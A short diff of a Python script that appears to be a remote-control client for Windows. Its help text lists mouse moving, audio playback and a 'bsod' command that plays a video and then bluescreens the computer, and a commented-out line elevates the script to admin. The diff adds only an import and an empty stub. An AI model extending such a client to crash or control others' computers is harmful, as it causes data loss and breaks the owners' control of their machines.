@@ -10,6 +10,7 @@ import ctypes
 import random
 import sys
 import argparse
+import MouseDataInterpreter as mdi
 
 #Initilizing things
 #ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1) # Runs as admin
@@ -59,6 +60,9 @@ def bsod(videopath, waittime):
 def helpm():
     returnmsg("mm x y - This command moves the mouse in the set coords \naudio stop | audio audiopath - Either stops or plays audio \nmmr - Moves the mouse in a random spot \nbsod videopath waittime - plays a local video then bluescreens the computer \nexit - Closes the client")
     
+#def autoMouse(mouseDataFile):
+    
+
 def returnScreenRes():
     res = win32api.GetSystemMetrics(0), win32api.GetSystemMetrics(1)
     return res
